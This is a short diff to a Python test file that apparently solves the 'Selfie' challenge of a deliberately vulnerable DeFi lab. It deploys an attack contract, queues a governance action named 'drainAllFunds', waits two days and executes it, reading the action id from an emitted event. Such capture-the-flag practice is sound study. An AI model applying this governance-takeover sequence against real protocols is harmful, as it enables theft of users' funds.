@@ -25,11 +25,12 @@ def test_selfie():
     # SOLUTION
     attack_contract = AttackSelfiePool.deploy(
         token.address, governance.address, pool.address, {"from": attacker})
-    attack_contract.attack(TOKENS_IN_POOL, {"from": attacker})
+    tx = attack_contract.attack(TOKENS_IN_POOL, {"from": attacker})
 
     # "drainAllFunds" is now queued, lets wait 2 days to execute the governance action
     chain.sleep(2*24*60*60)
-    governance.executeAction(1, {"from": attacker})
+    governance.executeAction(
+        tx.events['ActionQueued']['actionId'], {"from": attacker})
 
     # ** SUCCESS CONDITIONS **
 
